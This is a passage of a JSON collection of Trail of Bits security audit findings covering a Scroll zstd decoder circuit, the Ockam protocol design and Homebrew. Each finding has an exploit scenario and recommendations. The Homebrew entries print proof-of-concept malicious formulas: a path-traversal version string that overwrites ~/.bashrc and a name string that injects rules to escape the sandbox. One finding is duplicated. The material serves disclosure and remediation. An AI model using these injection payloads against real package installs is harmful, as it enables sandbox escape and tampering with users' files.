tables, we must validate against the ROM predefined table fields for // every state in the FSE table. meta.lookup_any( \"FseTable: predefined table validation\" , |meta| { let condition = and::expr([ meta.query_fixed(q_enable, Rotation::cur()), meta.query_advice(config.sorted_table.is_predefined, Rotation::cur()), not::expr(meta.query_advice(config.is_skipped_state, Rotation::cur())), not::expr(meta.query_advice(config.is_padding, Rotation::cur())), ]); let (table_kind, table_size, state, symbol, baseline, nb) = ( meta.query_advice(config.sorted_table.table_kind, Rotation::cur()), meta.query_advice(config.sorted_table.table_size, Rotation::cur()), meta.query_advice(config.state, Rotation::cur()), meta.query_advice(config.symbol, Rotation::cur()), meta.query_advice(config.baseline, Rotation::cur()), meta.query_advice(config.nb, Rotation::cur()), ); [ FixedLookupTag::PredefinedFse.expr(), table_kind, table_size, state, symbol, baseline, nb, ] .into_iter() .zip_eq(fixed_table.table_exprs(meta)) .map(|(arg, table)| (condition.expr() * arg, table)) .collect() }); Figure 12.2: aggregator/src/aggregation/decoder/tables/fse.rs#L590L622 However, the set of conditions under which these lookups occur diers from other sets of conditions where the is_llt , is_mot and is_mlt functions are used (either explicitly or implicitly), which could lead to soundness issues. Recommendations Short term, add explicit constraints to the table_kind witness, and ensure that the witness is constrained in every case. Long term, add negative tests to ensure that incorrect or unexpected values of table_kind do not satisfy the constraints of the decoder circuit.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "14. Missing a large number of test cases that should fail ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-06-scroll-zstd-compression-securityreview.pdf",
        "body": "Overall, we found that there is a severe lack of testing, with a total of only 17 tests that do not comprehensively test the functionality of the decoder circuit. Not only should tests cover the expected success cases, but they should also ensure that well-dened failure modes are not possible within the connes of the system. We have compiled a non-exhaustive list of such test cases below:       Boolean witnesses should not satisfy the witness generator if they are assigned non-Boolean values. This type of test is most valuable before implementing the custom wrapper type described in TOB-SCROLLZSTD-1 , but tests similar in nature are still recommended for similarly constrained values. Add tests for all valid RomTagTransition pairs, ensuring compatibility with the zstd specication ( TOB-SCROLLZSTD-4 ). Add tests for various BlockHeader congurations, ensuring congurations that fall outside the specication are rejected ( TOB-SCROLLZSTD-8 ). Add tests for the reserved compression mode bits ( TOB-SCROLLZSTD-10 ). Add tests that try to insert an invalid table_kind value ( TOB-SCROLLZSTD-12 ). Add randomized round trip encoder tests. There is currently a single test that checks the satisability of the encoding of a known string. However, this test is also for a singular string and is not easily generalized to other input sizes. Randomized round trip testing can better guarantee the correctness of the encoding and decoding steps by easily generating larger inputs. We also recommend the addition of fuzz testing. In large systems like these, it is hard to systematically test every edge case of the system. Fuzz testing enables the user to automate the randomization of inputs, leading to potentially higher constraint coverage. Recommendations Short term, add additional unit tests for the failure modes listed in the above issues. Long term, add support for fuzzing of the witness generator, where a valid witness can have some cells perturbed. If any of these small perturbations leads to another valid witness assignment, there is a high likelihood of a missing constraint somewhere. A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: N/A"
        ]
    },
    {
        "title": "1. The system is vulnerable to SNDL attacks by quantum computers ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-ockam-designreview.pdf",
        "body": "The Ockam system uses the Noise XX handshake pattern with ECDH based on X25519, which could be broken using a large-scale quantum computer. Currently, no quantum computer capable of doing this exists. Although Ockam could be quickly updated to resist quantum attacks, current handshakes would still be vulnerable to \"store now, decrypt later\" (SNDL) attacks using a quantum computer, as described in the exploit scenario below. The design should address whether this is considered as part of the threat model. Exploit Scenario An attacker captures and stores the full transcript of a handshake and the subsequent encrypted communications. Once a large-scale quantum computer becomes available, the attacker recovers all ECDH private keys using the quantum computer. They use this to obtain the derived keys from the transcript and decrypt the communications. Recommendations Short term, document whether SNDL attacks using a quantum computer are applicable to the threat model for dierent use cases so that users can consider this in the context of their own risk management. If the attacks are applicable, investigate the feasibility of incorporating post-quantum secure alternatives into the system. Because the goal is to prevent SNDL attacks, it is not necessary to upgrade all cryptographic primitives to be secure against a quantum computer. However, at least one of the contributions to the key derivation must come from a PQC KEM (e.g., Signals PQXDH). As described in the PQNoise paper, it is straightforward to update the Noise ee pattern using a PQC KEM to achieve the same round complexity. Instead of replacing the classical DH, we propose adding a PQC KEM to achieve a hybrid solution (e.g., the IETF draft on hybrid key exchange in TLS). Long term, if attacks using a quantum computer are part of the threat model for Ockam use cases, migrate both the key exchanges and digital signatures to a hybrid solution 16 Ockam Design Review incorporating both classical and post-quantum resistant primitives (e.g., using PQNoise with suitable hybrid KEMs). 17 Ockam Design Review",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Serialized VersionedData structs data is ambiguous ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-ockam-designreview.pdf",
        "body": "Identity private keys are used to sign both Change blocks, which are used to rotate the identity keys, and PurposeKeyAttestation blocks, which are used to attest to purpose keys. Before being signed, the data inside these blocks is serialized using the Concise Binary Object Representation (CBOR) data format and included in a VersionedData struct. However, this serialization will not add dierent labels for these dierent data types by itself, which means that the data eld of a VersionedData instance does not indicate which type it contains (i.e., ChangeData or PurposeKeyAttestationData). Therefore, it is possible to provide a signed VersionedData instance containing a PurposeKeyAttestationData block where the receiver expects it to contain a ChangeData block. The receiver will potentially accept the signature as valid as long as it is created using the expected identity key. Whether this confusion can be exploited depends on implementation details that are not in scope for this design review. Specically, it depends on what happens when a PurposeKeyAttestationData type is deserialized as a ChangeData type. Currently, it seems likely that this will fail due to dierences in the structure of the types, but it is not possible to determine the full behavior from the design description alone. Even if the current implementation rejects a serialized PurposeKeyAttestationData instance as invalid when it attempts to deserialize the byte vector as a ChangeData structure, a future version of the protocol may accept it as valid if either of the two types change. Exploit Scenario A node creates and attests to various purpose keys to outsource the handling of the purpose to other instances, which do not have access to the identity key. An attacker compromises one of the instances and obtains the PurposeKeyAttestation block containing a signed VersionedData instance. The attacker communicates a new Change to another node, while providing the signed VersionedData from the PurposeKeyAttestation block. The previous_signature eld inside the Change block is set to the signature from the PurposeKeyAttestation block (i.e., the signature on the VersionedData instance containing the 18 Ockam Design Review PurposeKeyAttestationData). The other node will accept the previous_signature on the VersionedData because it is a signature under the same identity primary key. For this exploit to be useful, the data eld of the VersionedData instance, which is a serialized PurposeKeyAttestationData type, must deserialize to a ChangeData type with a public key for which the attacker knows the corresponding private key. Otherwise, the attacker will be unable to provide a proper signature for the Change block. Recommendations Short term, specify in the design that the data eld inside the VersionedData struct to be signed using identity primary keys must be unambiguous. For example, this eld could be a single enum type that contains the PurposeKeyAttestationData and ChangeData types with dierent CBOR labels. Alternatively, add an additional label to the VersionedData struct to indicate which data type it contains. Long term, ensure that all dierent types of private keys used to create digital signatures sign only a single unambiguous type (with dierent labels for each of the possible subtypes or contained types). 19 Ockam Design Review",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "3. Truncating ChangeHistory hash to 160 bits introduces risk of collisions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-ockam-designreview.pdf",
        "body": "The Identifier and ChangeHash types are dened as the rst 160 bits of a SHA-256 hash of the Change record inside of a ChangeHistory chain. A collision attack against SHA-256 truncated to 160 bits is possible with a time cost of approximately 280 queries using standard collision-nding techniques based on Pollards Rho method. These gures are on the upper end of feasibility but still possible to exploit. Exploit Scenario Mallory, a user with an existing Ockam Identity wants to cause disagreement about her current primary public key between dierent nodes, who are relying on the latest ChangeHash to identify the users primary public key. She uses Pollards Rho method to nd two ChangeData records with the same ChangeHash, which allows her to create two distinct ChangeHistory chains where the nal entries disagree on the primary public key but still have the same ChangeHash. Computing 280 SHA-256 hashes is within the reach of botnets today. For comparison, the Bitcoin mining network computes about 268 SHA-256 hashes per second (or about 292 per year). The equivalent amount of computational resources can cross the 280 threshold in a little over 1 hour. Once a collision is found, Mallory then selectively shares dierent Change records to dierent partitions of the network. Recommendations Short term, increase the length of the truncated SHA-256 hash from 160 bits (20 bytes) to at least 192 bits (24 bytes) for the ChangeHash. With this change, the cost of nding a collision becomes 296 rather than 280, which multiplies the time required to nd a collision by a factor of 65,536. Consequently, the collision attack is no longer practical. Long term, whenever reducing the security margin of a cryptographic primitive (e.g., truncating hashes in this case), document why this is done and why the impact on security is considered acceptable. 20 Ockam Design Review",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. The meanings of the primary key elds created_at and expires_at are undocumented ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-ockam-designreview.pdf",
        "body": "The meanings of the created_at and expires_at elds on the ChangeData type are not suciently explained by the design documentation. This may lead users to make security-critical decisions based on a awed interpretation of these elds. The ChangeData type is used to update a users primary key. The types two elds, created_at and expires_at, dene the lifetime of the new key. The Identities and Credentials section mentions that the expires_at timestamp indicates when the primary_public_key included in the change should stop being relied on as the primary public key of this identity. However, the documentation does not specify what happens if a user allows their primary key to expire without signing and broadcasting a new change. Intuitively, it is easy to assume that nodes accept changes only from live keys, so an expired key can no longer sign new changes. However, this is not described in the documentation and there is currently no check in the code performing change history validation to ensure this behavior. The meaning of the created_at eld is also not suciently explained. It is currently unclear how this eld should be validated or acted on by other nodes. In fact, the implementation explicitly allows changes where created_at is greater than expires_at. This means that the created_at eld cannot be relied on to dene an overall lifetime or validity period for the key. Exploit Scenario Alice uses Ockam to set up a network of nodes. One of the nodes is taken oine, and eventually the primary key used for the node expires. Since the key has expired, Alice believes that it is no longer sensitive and does not take proper precautions to either protect or delete the key. Mallory, a malicious user, gains access to the node and obtains the expired key. She can now create a new change based on the expired key. She broadcasts the updated change history to other nodes in the network. Since nodes do not check the expires_at eld 21 Ockam Design Review when the change history is validated, the new change is accepted as valid by other nodes, allowing Mallory to gain access to the network. Recommendations Short term, document the expected meanings of the created_at and expires_at elds, and specify how these elds should be validated. Ensure that changes signed by expired keys are rejected by all nodes. Alternatively, if the lifetime is meant to be enforced only for purpose key attestations, document this restriction and rename the two elds (e.g., to attestations_not_valid_before and attestations_not_valid_after) to make this clear. Additionally, clearly specify the full life cycle of secrets and credentials, including any applicable revocation or expiration mechanisms. Long term, ensure that the documentation always reects the proper meaning of each value specied by the protocol. In particular, if values have unintuitive or surprising meanings, they should always be documented. 22 Ockam Design Review 5. Insu\u0000cient threat model documentation Severity: Medium Diculty: Not Applicable Type: Cryptography Finding ID: TOB-OCK-5 Target: All sections",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. The meanings of the primary key elds created_at and expires_at are undocumented ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-ockam-designreview.pdf",
        "body": "The meanings of the created_at and expires_at elds on the ChangeData type are not suciently explained by the design documentation. This may lead users to make security-critical decisions based on a awed interpretation of these elds. The ChangeData type is used to update a users primary key. The types two elds, created_at and expires_at, dene the lifetime of the new key. The Identities and Credentials section mentions that the expires_at timestamp indicates when the primary_public_key included in the change should stop being relied on as the primary public key of this identity. However, the documentation does not specify what happens if a user allows their primary key to expire without signing and broadcasting a new change. Intuitively, it is easy to assume that nodes accept changes only from live keys, so an expired key can no longer sign new changes. However, this is not described in the documentation and there is currently no check in the code performing change history validation to ensure this behavior. The meaning of the created_at eld is also not suciently explained. It is currently unclear how this eld should be validated or acted on by other nodes. In fact, the implementation explicitly allows changes where created_at is greater than expires_at. This means that the created_at eld cannot be relied on to dene an overall lifetime or validity period for the key. Exploit Scenario Alice uses Ockam to set up a network of nodes. One of the nodes is taken oine, and eventually the primary key used for the node expires. Since the key has expired, Alice believes that it is no longer sensitive and does not take proper precautions to either protect or delete the key. Mallory, a malicious user, gains access to the node and obtains the expired key. She can now create a new change based on the expired key. She broadcasts the updated change history to other nodes in the network. Since nodes do not check the expires_at eld 21 Ockam Design Review when the change history is validated, the new change is accepted as valid by other nodes, allowing Mallory to gain access to the network. Recommendations Short term, document the expected meanings of the created_at and expires_at elds, and specify how these elds should be validated. Ensure that changes signed by expired keys are rejected by all nodes. Alternatively, if the lifetime is meant to be enforced only for purpose key attestations, document this restriction and rename the two elds (e.g., to attestations_not_valid_before and attestations_not_valid_after) to make this clear. Additionally, clearly specify the full life cycle of secrets and credentials, including any applicable revocation or expiration mechanisms. Long term, ensure that the documentation always reects the proper meaning of each value specied by the protocol. In particular, if values have unintuitive or surprising meanings, they should always be documented. 22 Ockam Design Review",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Insu\u0000cient threat model documentation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-ockam-designreview.pdf",
        "body": "The threat model for Ockams protocols is not specied in the documentation. There is no description of the dierent actors in the system, the assets they value, the other actors they trust, and the security controls for achieving security goals. From the threat model, it should be clear what aspects of the assets are important, including but not limited to condentiality, integrity or authenticity, and availability. The design review included weekly discussions between auditors and developers, who provided all relevant threat modeling information for the two in-scope use cases. However, in the absence of a documented general threat model for the protocol, users and developers must make assumptions about the security goals of each component and how these goals are met in the implementation. If any of these assumptions are false, this could lead to surprising behavior and potentially real security issues when users deploy the protocol. There is no specic exploit scenario for this nding, so the diculty rating is not applicable. Recommendations Short term, add an informal threat model to each use case and section of the documentation to ensure no gaps exist. Long term, develop a formal threat model that applies to Ockams protocols. Explicitly state any assumptions that must be true for the protocol to be secure. Dene dierent types of threat actors and specify how the protocol deals with them. Once a general threat model is in place, each use case and section of the protocol needs a threat model section that describes only the ways in which they deviate from the general model for the overall protocol. 23 Ockam Design Review",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Not Applicable"
        ]
    },
    {
        "title": "6. The supported signature schemes have di\u0000erent security properties ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-11-ockam-designreview.pdf",
        "body": "Ockams supported signature schemes, EdDSA and ECDSA, oer dierent security guarantees but are used interchangeably. Although this issue is not currently exploitable, if Ockam modies the system in the future, it could become necessary to rely on additional security guarantees. The signed change history in Ockam allows an identity to rotate its primary key and attest to the validity of this change. Each rotation is associated with a Change data structure that is hashed and then signed by the current primary key and the previous primary key (if it exists). The documentation species two signing algorithms: EdDSACurve25519Signature and ECDSASHA256CurveP256Signature. The former is the preferred algorithm, as the latter algorithm is supported only due to the lack of support for EdDSA in cloud hardware security modules (HSMs). A formal modeling of the security properties of the signature scheme with CryptoVerif reveals a discrepancy between the security guarantees oered by the two schemes. In terms of security guarantees, EdDSA and ECDSA are equivalent only in that they are both believed to guarantee Existential Unforgeability under Chosen-Message Attacks (EUF-CMA). This means that an attacker who has several valid signatures on various messages will be unable to create a valid signature for a new message. However, EdDSA, as instantiated, provides additional guarantees that ECDSA does not. In particular, EdDSA provides Strong Unforgeability under Chosen-Message Attacks (SUF-CMA), so an attacker who has a number of valid signatures on various messages will be unable to create a valid new message-signature pair. ECDSA does not provide this guarantee because for any valid ECDSA signature (r,s), the signature (r,-s) is also valid. This means that an attacker could take a Change block with associated ECDSA signatures and share the same Change block with modied (but valid) signatures. When modeling change histories with CryptoVerif, only the strong unforgeability of the rst change can be proven. The issue described above does not pose a direct threat in the current deployment of Ockam in the context of the two in-scope use cases, which do not rely on strong 24 Ockam Design Review unforgeability. However, from a design perspective, it is desirable to have a clear understanding of what security guarantees are expected from dierent components, irrespective of their concrete instantiations. Furthermore, any future extension to the protocol might involve beyond unforgeability guarantees like exclusive ownership (which means that any valid signature can be created only from the private key corresponding to the public key). Fortunately, the current signing mechanism in Ockam is close to the BUFF construction, which provides beyond unforgeability security. There is no specic exploit scenario for this nding, so the diculty rating is not applicable. Recommendations Short term, consider adding a brief description of the security properties of the signed change histories and other signed data structures. Then document how the instantiations of dierent components provide the expected security guarantees. Consider all use cases of signatures in the system and whether any beyond unforgeability guarantees might be expected. If SUF-CMA security is desired, ECDSA can be modied by restricting the s component of the signature to the upper or lower half of its range. Long term, specify all the cryptographic assumptions each system component is expected to meet for the protocol to be secure. Document how each instantiation of a specic primitive meets the required assumption. 25 Ockam Design Review A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Not Applicable"
        ]
    },
    {
        "title": "1. Path traversal during le caching ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf",
        "body": "A path traversal when creating symlinks to cached les allows a malicious formula to create a symlink in an arbitrary location to a le with arbitrary contents during formula installation. The following code determines where to place a symlink to a cached downloaded le. def symlink_location return @symlink_location if defined?(@symlink_location) ext = Pathname(parse_basename(url)).extname @symlink_location = @cache/\"#{name}--#{version}#{ext}\" end Figure 1.1: Code to generate symlink location (brew/Library/Homebrew/download_strategy.rb:287292) However, a formulas version may contain special characters, such as dots and slashes (see also TOB-BREW-4). This allows for a path traversal. Exploit Scenario An attacker creates a pull request on homebrew-core attempting to add the following formula: # modifyBashrc.rb class Modifybashrc < Formula url \"https://example.com/files/.bashrc\" version \"/../../../../.bashrc\" end Figure 1.2: Malicious formula denition that overwrites .bashrc He then hosts a malicious .bashrc le on https://example.com/files/.bashrc. Whenever this formula is built, the malicious .bashrc le will be downloaded, and a symlink from ~/.bashrc to the downloaded le will be created. In this case, it would be fairly obvious from the package denition that it is malicious, so the maintainers would likely be able to catch it early. The attacker may be able to avoid this by setting the version surreptitiously using Ruby metaprogramming tricks, but this would be fairly dicult. Recommendations Short term, remove any special characters from the version name before using it when creating the @symlink_location path. Preferably, also disallow formulas from having these special characters in their version names in the rst place (see TOB-BREW-4). Long term, audit any uses of user-inputted strings to create paths. Ensure that the input is properly sanitized before being used.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "2. Sandbox escape via string injection ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf",
        "body": "Homebrew creates its sandbox conguration le in a way that is vulnerable to string injection. The following are examples of lines added to the sandbox le that are vulnerable to injection. 60 69 allow_write_path \"#{Dir.home(ENV.fetch(\"USER\"))}/.cvspass\" ... allow_write_path formula.rack Figure 2.1: Vulnerable sandbox cong additions (brew/Library/Homebrew/sandbox.rb:60,69) Because formula.rack is written directly to the conguration le, a formula with a double quote in its name (which can be achieved by setting the @name variable in the initialize function) can break out of its portion of the sandbox conguration le and write its own custom rules allowing itself permissions that it should not have. Sandboxing will also break if the installing users home directory has a path with a double quote in it, or if the Homebrew Cellar has a path with a double quote in it, although these scenarios are far less likely. Exploit Scenario An attacker creates a pull request on homebrew-core attempting to add the following formula: # breakout.rb class Breakout < Formula url \"https://example.com/example-1.0.tar.gz\" def initialize(name, path, spec, alias_path: nil, tap: nil, force_bottle: false) super @name = \"\\\"))\\n(allow file-write* (subpath \\\"/\\\"))\\n(allow file-write-setugid (subpath \\\"/\\\"))\\n(allow file-read-data (subpath \\\"/dummy\" # the dummy rule at the end is needed because trailing /s get stripped end def install system \"make\", \"install\" end end Figure 2.2: Malicious formula that breaks out of its sandbox When this le is built, the following sandbox conguration le is generated (malicious portions are highlighted in red): (version 1) (debug deny) ; log all denied operations to /var/log/system.log (allow file-write* (subpath \"/private/tmp\")) (allow file-write-setugid (subpath \"/private/tmp\")) (allow file-write* (subpath \"/private/var/tmp\")) (allow file-write-setugid (subpath \"/private/var/tmp\")) (allow file-write* (regex #\"^/private/var/folders/[^/]+/[^/]+/[C,T]/\")) (allow file-write-setugid (regex #\"^/private/var/folders/[^/]+/[^/]+/[C,T]/\")) (allow file-write* (subpath \"/private/tmp\")) (allow file-write-setugid (subpath \"/private/tmp\")) (allow file-write* (subpath \"/Users/sam/Library/Caches/Homebrew\")) (allow file-write-setugid (subpath \"/Users/sam/Library/Caches/Homebrew\")) (allow file-write* (subpath \"/Users/sam/Library/Logs/Homebrew/\")) (allow file-write* (subpath \"/\")) (allow file-write-setugid (subpath \"/\")) (allow file-read-data (subpath \"/dummy\")) (allow file-write-setugid (subpath \"/Users/sam/Library/Logs/Homebrew/\")) (allow file-write* (subpath \"/\")) (allow file-write-setugid (subpath \"/\")) (allow file-read-data (subpath \"/dummy\")) (allow file-write* (subpath \"/Users/sam/.cvspass\")) (allow file-write-setugid (subpath \"/Users/sam/.cvspass\")) (allow file-write* (subpath \"/Users/sam/.fossil\")) (allow file-write-setugid (subpath \"/Users/sam/.fossil\")) (allow file-write* (subpath \"/Users/sam/.fossil-journal\")) (allow file-write-setugid (subpath \"/Users/sam/.fossil-journal\")) (allow file-write* (subpath \"/Users/sam/Library/Developer\")) (allow file-write-setugid (subpath \"/Users/sam/Library/Developer\")) (allow file-write* (subpath \"/opt/homebrew/Cellar/\")) (allow file-write* (subpath \"/\")) (allow file-write-setugid (subpath \"/\")) (allow file-read-data (subpath \"/dummy\")) (allow file-write-setugid (subpath \"/opt/homebrew/Cellar/\")) (allow file-write* (subpath \"/\")) (allow file-write-setugid (subpath \"/\")) (allow file-read-data (subpath \"/dummy\")) (allow file-write* (subpath \"/opt/homebrew/etc\")) (allow file-write-setugid (subpath \"/opt/homebrew/etc\")) (allow file-write* (subpath \"/opt/homebrew/var\")) (allow file-write-setugid (subpath \"/opt/homebrew/var\")) (allow file-write* (literal \"/dev/ptmx\") (literal \"/dev/dtracehelper\") (literal \"/dev/null\") (literal \"/dev/random\") (literal \"/dev/zero\") (regex #\"^/dev/fd/[0-9]+$\") (regex #\"^/dev/tty[a-z0-9]*$\") ) (deny file-write*) ; deny non-allowlist file write operations (allow process-exec (literal \"/bin/ps\") (with no-sandbox) ) ; allow certain processes running without sandbox (allow default) ; allow everything else Figure 2.3: Sandbox conguration le for Breakout formula (malicious lines are highlighted) Now make install is run without any sandboxing, and the attacker gains arbitrary unsandboxed code execution on the installing machine. In this case, it would be fairly obvious from the package denition that the package is malicious, so the maintainers would likely be able to catch it early. The attacker may be able to avoid this by setting the @name variable surreptitiously using Ruby metaprogramming tricks, but this would be fairly dicult. Recommendations Short term, modify allow_write_path so that it checks for special characters (quotes, newlines, etc.) in the path before adding its rules. In addition, also ensure that special characters are removed from a formulas @name before creating a formulas keg path. Preferably, also disallow formulas from having these special characters in their names in the rst place (see TOB-BREW-4). Long term, audit any uses of user-inputted strings to create paths. Ensure that the input is properly sanitized before being used.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "3. Allow default rule in sandbox conguration is overly permissive ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf",
        "body": "Currently, the sandbox conguration for Homebrew includes the rule (allow default), which leaves some of Apples sandboxing features unused, and which allows formula build scripts to have multiple permissions that they do not need:  Build scripts have permission to send signals to processes outside of their process group. This allows them to kill processes belonging to the user.  Build scripts have permission to send network requests. Aside from allowing for le downloads without integrity checks (see TOB-BREW-8), this also allows build scripts to send requests to localhost ports. This could potentially allow for formulas to exploit vulnerable software running locally, and to access ports that are ordinarily blocked from external attackers by the rewall.  Build scripts have permission to reboot the host machine. This ability is mitigated by the fact that, typically, the user running brew install does not have permission to call reboot, meaning that the build script cannot call reboot either. Exploit Scenario An attacker contrives a formula that interacts with the local system via signals or local network requests during the build period, potentially allowing code within the sandboxed build script to pivot outside of the sandbox. Recommendations Go through Apple sandboxing documentation (third-party documentation may be necessary) and consider which operations can be blocked, banning any that are not needed for Homebrew formula builds. References  Unocial third-party documentation on Apple sandboxing: This is the best documentation we could nd on the subject.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "4. Special characters are allowed in package names and versions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf",
        "body": "Homebrew needlessly allows for special characters in package names and versions. While this is not directly an issue on its own, it leads to other issues such as TOB-BREW-1, TOB-BREW-2, TOB-BREW-16, and TOB-BREW-22. Disallowing special characters would make path traversal and string injection attacks much more dicult. Recommendations Short term, disallow special characters in formula names and versions. Do not put this check into the Formula class because formula denitions can overwrite Formula class methods. Instead, perform the check whenever a formula is about to be used. Long term, ensure that similar sanitization is done on any other potentially malicious values.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Use of weak cryptographic digest in Formulary namespaces ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf",
        "body": "Homebrew uses two dynamic namespaces to cache loaded formulae: FormulaNamespace (for formulae loaded from their Ruby denitions) and FormulaNamespaceAPI (for formulae loaded from their JSON API specications). Both of these create unique keys under their namespaces by taking the MD5 digest of a unique identier for an underlying formula (one that cannot directly be embedded in a Ruby identier). namespace = \"FormulaNamespace#{Digest::MD5.hexdigest(path.to_s)}\" Figure 5.1: Loading into FormulaNamespace with a digested identier namespace = :\"FormulaNamespaceAPI#{Digest::MD5.hexdigest(name)}\" Figure 5.2: Loading into FormulaNamespaceAPI with a digested identier MD5 is considered broken in terms of collision resistance, with collisions being computable on basic consumer hardware. Exploit Scenario An attacker contrives a malicious formula whose path (for local formulae) or name (for API formulae), when digested, collides with a legitimate formula. When both formulae are loaded, the attacker may be able to induce confusion within Homebrew about which formula is being operated on. The attackers job of nding a collision is made slightly more dicult by restrictions in their input space: they can use only characters that are valid in a formula name (for FormulaNamespaceAPI) or in a valid formula path (for FormulaNamespace). Recommendations Switch to a digest function that is considered resistant to collisions, such as SHA-256. Alternatively, develop a path or name normalization scheme that produces valid Ruby identiers, so that a hash function does not need to be used.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "6. Extraction is not sandboxed ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf",
        "body": "Homebrew supports many dierent archive formats for source archives that should be considered untrustworthy. The unpacking process should also be run under a sandbox in order to prevent intentional or unintentional le writes outside of expected directories. # @api public def stage(&block) UnpackStrategy.detect(cached_location, prioritize_extension: true, ref_type: @ref_type, ref: @ref) .extract_nestedly(basename: basename, prioritize_extension: true, verbose: verbose? && !quiet?) chdir(&block) if block end Figure 6.1: This stage function unpacks potentially untrusted source archives without a sandbox Exploit Scenario An attacker constructs a source archive using one of the many supported formats that can induce an arbitrary le write. We analyzed a few of the common formats that have allowed this type of attack in the past (namely tar, 7z, and rar), which all now seem to mitigate this type of attack, but future unpackers or latent bugs in the existing unpackers may allow for an attacker to perform an arbitrary le write. Recommendations Short term, Homebrew should ensure that the supported unpackers protect against this type of attack. Long term, Homebrew should sandbox the unpacking process.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Use of ldd on untrusted inputs ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf",
        "body": "On Linux, Homebrew uses ldd to list the dynamic dependencies of an executable (i.e., the shared libraries that it declares as dependencies): ldd = DevelopmentTools.locate \"ldd\" ldd_output = Utils.popen_read(ldd, path.expand_path.to_s).split(\"\\n\") Figure 7.1: Using ldd to collect shared object dependencies This metadata is produced for all ELF les in a binary, as part of providing the Linux equivalent of Homebrew-on-Rubys binary relocation functionality. Running ldd can result in arbitrary code execution when a binary has a custom ELF interpreter specied. This may allow a malicious bottle to run arbitrary code outside of the context of the installing sandbox (since relocation is not sandboxed) with relative stealth (since no code is obviously executed). Exploit Scenario An attacker contrives an ELF binary with a custom .interp section, enabling arbitrary code execution. This execution occurs surreptitiously during Homebrews binary relocation phase, before the user expects any formula-provided executables to run. Recommendations Short term, Homebrew can check an ELFs interpreter (in the .interp section) before loading it with ldd and, if it appears to be a non-standard interpreter, refuse to handle it. Long term, Homebrew can replace ldd with similar inspection tools, such as readelf or objdump. Both are capable of collecting a binarys dynamic linkages without arbitrary code execution. 8. Formulas allow for external resources to be downloaded during the install step Severity: Medium Diculty: High Type: Access Controls Finding ID: TOB-BREW-8 Target: brew/Library/Homebrew/formula_installer.rb",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "9. Use of Marshal ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf",
        "body": "The Dependency class denes _dump and _load APIs that use Rubys Marshal internally. # Define marshaling semantics because we cannot serialize @env_proc. def _dump(*) Marshal.dump([name, tags]) end def self._load(marshaled) new(*Marshal.load(marshaled)) # rubocop:disable Security/MarshalLoad end Figure 9.1: Dependency._dump and Dependency._load Marshal is a fundamentally dangerous serialization format, by design: it evaluates arbitrary Ruby objects on deserialization, allowing an attacker to easily form Marshalled inputs that run arbitrary code. After an initial analysis, was unable to determine any parts of the code where these Dependency APIs are used. However, due to Rubys dynamic nature, we are unable to state condently that they are not called indirectly somewhere in the codebase. Exploit Scenario If an attacker manages to invoke Dependency._load with a controlled payload, they may be able to execute arbitrary code surreptitiously outside of the context of an installation sandbox. Recommendations Short term, if possible, replace these uses of Marshal with a safer serialization format (such as JSON). Long term, evaluate the need for this API; if it is unneeded, remove it entirely.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Low"
        ]
    },
    {
        "title": "10. Lack of sandboxing on Linux ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-08-28-homebrew-securityreview.pdf",
